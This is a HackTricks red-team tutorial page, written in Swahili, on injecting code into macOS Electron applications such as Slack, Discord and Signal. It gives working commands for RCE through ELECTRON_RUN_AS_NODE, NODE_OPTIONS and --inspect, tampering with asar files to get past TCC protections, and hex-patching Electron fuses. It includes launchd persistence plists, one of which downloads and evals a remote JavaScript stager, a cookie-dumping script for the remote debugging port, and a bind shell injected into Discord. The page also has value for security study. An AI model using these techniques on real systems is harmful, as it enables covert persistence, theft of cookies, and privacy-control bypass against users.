# Uingizaji wa Programu za macOS za Electron

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inayotangazwa katika HackTricks** au **kupakua HackTricks katika PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

Ikiwa haujui Electron ni nini, unaweza kupata [**taarifa nyingi hapa**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Lakini kwa sasa tu jua kuwa Electron inaendesha **node**.\
Na node ina **parameta** na **mazingira ya env** ambayo yanaweza kutumika kuifanya itekeleze **nambari nyingine** mbali na faili iliyotajwa.

### Mafunguo ya Electron

Teknolojia hizi zitajadiliwa baadaye, lakini hivi karibuni Electron imeongeza **alama kadhaa za usalama ili kuzuia**. Hizi ni [**Mafunguo ya Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) na hizi ndizo zinazotumiwa kuzuia programu za Electron katika macOS kutoka kwa **kupakia nambari isiyojulikana**:

* **`RunAsNode`**: Ikiwa imelemazwa, inazuia matumizi ya mazingira ya env **`ELECTRON_RUN_AS_NODE`** kuingiza nambari.
* **`EnableNodeCliInspectArguments`**: Ikiwa imelemazwa, vigezo kama `--inspect`, `--inspect-brk` havitaheshimiwa. Kuepuka njia hii ya kuingiza nambari.
* **`EnableEmbeddedAsarIntegrityValidation`**: Ikiwa imeamilishwa, faili iliyopakia **`asar`** itathibitishwa na macOS. Kuzuia njia hii ya **kuingiza nambari** kwa kubadilisha maudhui ya faili hii.
* **`OnlyLoadAppFromAsar`**: Ikiwa hii imeamilishwa, badala ya kutafuta kupakia kwa utaratibu ufuatao: **`app.asar`**, **`app`** na mwishowe **`default_app.asar`**. Itachunguza na kutumia tu app.asar, kuhakikisha kuwa wakati **inachanganywa** na mafunguo ya **`embeddedAsarIntegrityValidation`**, haiwezekani **kupakia nambari isiyothibitishwa**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Ikiwa imeamilishwa, mchakato wa kivinjari hutumia faili inayoitwa `browser_v8_context_snapshot.bin` kwa picha yake ya V8.

Funguo nyingine ya kuvutia ambayo haitazuia uingizaji wa nambari ni:

* **EnableCookieEncryption**: Ikiwa imeamilishwa, hifadhidata ya kuki kwenye diski imefichwa kwa kutumia funguo za kriptografia za kiwango cha OS.

### Kuangalia Mafunguo ya Electron

Unaweza **kuangalia alama hizi** kutoka kwa programu na:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Kubadilisha Umeme wa Electron

Kama [**nyaraka zinavyosema**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), usanidi wa **Umeme wa Electron** umewekwa ndani ya **binary ya Electron** ambayo ina mahali fulani kamba **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Katika programu za macOS, hii kawaida iko katika `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Unaweza kupakia faili hii katika [https://hexed.it/](https://hexed.it/) na kutafuta kwa string iliyotangulia. Baada ya string hii, unaweza kuona katika ASCII nambari "0" au "1" ikionyesha ikiwa kila fuse imelemazwa au imewezeshwa. Tu badilisha nambari ya hex (`0x30` ni `0` na `0x31` ni `1`) ili **kubadilisha thamani za fuse**.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tafadhali kumbuka kuwa ikiwa unajaribu **kubadilisha** **binary ya Electron Framework** ndani ya programu na herufi hizi zilizobadilishwa, programu haitaendeshwa.

## RCE kuongeza nambari kwa Maombi ya Electron

Kuna inaweza kuwa na **faili za JS/HTML za nje** ambazo programu ya Electron inatumia, kwa hivyo mshambuliaji anaweza kuingiza nambari katika faili hizi ambazo saini yake haitakaguliwa na kutekeleza nambari ya aina yoyote katika muktadha wa programu.

{% hint style="danger" %}
Hata hivyo, kwa sasa kuna vizuizi 2:

* **`kTCCServiceSystemPolicyAppBundles`** ruhusa inahitajika kubadilisha Programu, kwa hivyo kwa chaguo-msingi hii haiwezekani tena.
* Faili iliyopangwa ya **`asap`** kawaida ina fuses **`embeddedAsarIntegrityValidation`** `na` **`onlyLoadAppFromAsar`** `imelemazwa`

Hii inafanya njia hii ya shambulio kuwa ngumu zaidi (au haiwezekani).
{% endhint %}

Tafadhali kumbuka kuwa ni rahisi kukiuka mahitaji ya **`kTCCServiceSystemPolicyAppBundles`** kwa kunakili programu kwenye saraka nyingine (kama **`/tmp`**), kubadilisha jina la folda **`app.app/Contents`** kuwa **`app.app/NotCon`**, **kubadilisha** faili ya **asar** na nambari yako **mbaya**, kuirudisha jina lake kuwa **`app.app/Contents`** na kuitekeleza.

Unaweza kufungua nambari kutoka kwenye faili ya asar na:
```bash
npx asar extract app.asar app-decomp
```
Na pakia tena baada ya kubadilisha na:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE na `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Kulingana na [**nyaraka**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), ikiwa hii variable ya mazingira imewekwa, itaanza mchakato kama mchakato wa kawaida wa Node.js.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Ikiwa fuse **`RunAsNode`** imelemazwa, var ya mazingira **`ELECTRON_RUN_AS_NODE`** itapuuzwa, na hii haitafanya kazi.
{% endhint %}

### Uingizaji kutoka kwa App Plist

Kama [**inavyopendekezwa hapa**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), unaweza kutumia var ya mazingira hii katika plist ili kudumisha uthabiti:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE na `NODE_OPTIONS`

Unaweza kuhifadhi payload katika faili tofauti na kuitekeleza:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Ikiwa fuse **`EnableNodeOptionsEnvironmentVariable`** imelemazwa, programu itapuuza env var **NODE\_OPTIONS** wakati inapoanza isipokuwa env variable **`ELECTRON_RUN_AS_NODE`** imewekwa, ambayo itapuuzwa pia ikiwa fuse **`RunAsNode`** imelemazwa.

Ikiwa haujaweka **`ELECTRON_RUN_AS_NODE`**, utapata **kosa**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Uingizaji kutoka kwa App Plist

Unaweza kutumia env variable hii katika plist ili kudumisha uthabiti kwa kuongeza funguo hizi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE na ukaguzi

Kulingana na [**hii**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ikiwa unatekeleza programu ya Electron na bendera kama **`--inspect`**, **`--inspect-brk`** na **`--remote-debugging-port`**, **bandari ya ukaguzi itafunguliwa** ili uweze kuunganisha (kwa mfano kutoka Chrome katika `chrome://inspect`) na utaweza **kuingiza nambari ndani yake** au hata kuzindua michakato mipya.\
Kwa mfano:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Ikiwa fuse **`EnableNodeCliInspectArguments`** imelemazwa, programu itapuuza vigezo vya node (kama `--inspect`) wakati inapoanza isipokuwa ikiwa mazingira ya env **`ELECTRON_RUN_AS_NODE`** yameset, ambayo pia yatapuuzwa ikiwa fuse **`RunAsNode`** imelemazwa.

Walakini, bado unaweza kutumia paramu ya electron `--remote-debugging-port=9229` lakini mzigo uliopita hautafanya kazi kutekeleza michakato mingine.
{% endhint %}

Kwa kutumia paramu **`--remote-debugging-port=9222`** niwezekana kuiba baadhi ya habari kutoka kwa Programu ya Electron kama **historia** (na amri za GET) au **vidakuzi** vya kivinjari (kwani vimefichuliwa ndani ya kivinjari na kuna **kituo cha json** ambacho kitawapa).

Unaweza kujifunza jinsi ya kufanya hivyo [**hapa**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) na [**hapa**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) na tumia zana ya moja kwa moja [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) au script rahisi kama:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
Katika [**blogpost hii**](https://hackerone.com/reports/1274695), uchunguzi huu unatumika kufanya kichwa cha chrome **kupakua faili za aina yoyote mahali popote**.

### Uingizaji kutoka kwa App Plist

Unaweza kutumia env variable hii katika plist ili kudumisha uthabiti kwa kuongeza funguo hizi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Kuepuka TCC kwa kutumia Toleo za Zamani

{% hint style="success" %}
TCC daemon kutoka kwa macOS haichunguzi toleo lililotekelezwa la programu. Kwa hivyo, ikiwa **hauwezi kuingiza nambari kwenye programu ya Electron** kwa kutumia njia yoyote ya awali, unaweza kupakua toleo la zamani la programu na kuingiza nambari ndani yake kwani bado itapata ruhusa za TCC (isipokuwa Cache ya Uaminifu inazuia hilo).
{% endhint %}

## Kukimbia Nambari Isiyo ya JS

Njia za awali zitaruhusu kukimbia **nambari ya JS ndani ya mchakato wa programu ya electron**. Walakini, kumbuka kuwa **mchakato wa mtoto unakimbia chini ya wasifu sawa wa sanduku** kama programu mama na **urithi ruhusa zao za TCC**.\
Kwa hivyo, ikiwa unataka kutumia vibali kufikia kamera au kipaza sauti kwa mfano, unaweza tu **kukimbia faili nyingine kutoka kwa mchakato**.

## Kuingiza Kiotomatiki

Zana [**electroniz3r**](https://github.com/r3ggi/electroniz3r) inaweza kutumiwa kwa urahisi kutafuta programu za Electron zilizo na udhaifu zilizosanikishwa na kuingiza nambari ndani yao. Zana hii itajaribu kutumia njia ya **`--inspect`**:

Unahitaji kuichanganua mwenyewe na unaweza kuitumia kama ifuatavyo:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Marejeo

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
